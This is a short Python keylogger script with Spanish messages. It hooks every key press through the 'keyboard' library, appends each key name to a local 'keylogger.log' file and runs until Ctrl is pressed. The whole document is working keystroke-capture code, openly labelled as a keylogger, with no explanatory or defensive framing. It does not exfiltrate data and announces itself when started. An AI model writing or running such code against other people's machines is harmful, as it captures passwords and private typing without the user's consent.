import keyboard
def evento_teclado(event):
    with open('keylogger.log','a') as file:
        file.write(event.name)

keyboard.on_press(evento_teclado)

print("Keyloggerr ejecutado, presionar 'Ctrl' para parar su ejecución")
keyboard.wait('ctrl')
